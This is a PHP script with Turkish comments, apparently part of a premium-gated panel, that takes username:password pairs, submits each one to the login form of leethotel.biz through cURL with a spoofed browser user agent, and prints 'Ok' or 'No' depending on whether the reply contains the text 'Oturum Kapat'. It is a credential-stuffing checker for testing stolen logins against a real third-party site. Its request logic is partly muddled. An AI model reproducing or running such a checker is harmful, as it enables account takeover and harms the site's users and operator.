<?php
include_once '../includes/baglan.php';
session_start();
if(isset($_SESSION['uid']) && isset($_SESSION['username'])){
$username=$_SESSION['username'];
$sql = "SELECT * FROM users WHERE username = ?";
$stmt = $con->prepare($sql) or die ($con->error);
$stmt->bind_param('s',$username);
$stmt->execute();
$result_username = $stmt->get_result();
$row = $result_username->fetch_assoc();
if($row['pre']<1){

header("Location:/404.html");

}}else{

  header("Location:/auth/auth-login");
}
$lista = htmlspecialchars($_GET['lista']);
$array = explode(":",$lista);

$username = trim($array[0]);
$password = trim($array[1]);


define('USER_AGENT', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36');
 
define('COOKIE_FILE', 'cookie2.txt'); 
define('LOGIN_ACTION_URL', 'https://www.leethotel.biz/account/submit');
 
define('LOGIN_FORM_URL', 'https://www.leethotel.biz/');
 
if(isset($_POST['username'])){
$username=$_POST['username'];
$password=$_POST['password'];
$postValues = array(
    'credentials_username' => $username,
    'credentials_password' => $password,
    '_asteroid' => ""
);
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, LOGIN_ACTION_URL);
 
curl_setopt($curl, CURLOPT_POST, true);
 
curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($postValues));
 

curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, true);
 

curl_setopt($curl, CURLOPT_COOKIEJAR, COOKIE_FILE);
 
curl_setopt($curl, CURLOPT_USERAGENT, USER_AGENT);
 
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 
curl_setopt($curl, CURLOPT_REFERER, LOGIN_FORM_URL);
 
// Herhangi bir yönlendirmeyi takip etmek ister miyiz?
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
 
//Giriş istediğini çalıştıralım.

//Hata kontrolü
if(curl_errno($curl)){
    throw new Exception(curl_error($curl));
}
 
//Şu an giriş yaptık. Şifre korumalı bir sayfaya erişmeye çalışalım
curl_setopt($curl, CURLOPT_URL, 'https://www.leethotel.biz/account/submit');
 
//Aynı çerez dosyasını kullanalım.
curl_setopt($curl, CURLOPT_COOKIEJAR, COOKIE_FILE);
 
curl_setopt($curl, CURLOPT_USERAGENT, USER_AGENT);
 
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, true);
 
//Sonucu ekrana yazdıralım. 
$site=curl_exec($curl);

$m=preg_match('/Oturum Kapat/', $site);

   if($m){
echo  $username.":".$password." | Ok <br>";
   }else{
echo  $username.":".$password." | No <br>";
   }

curl_close($curl);
}
?>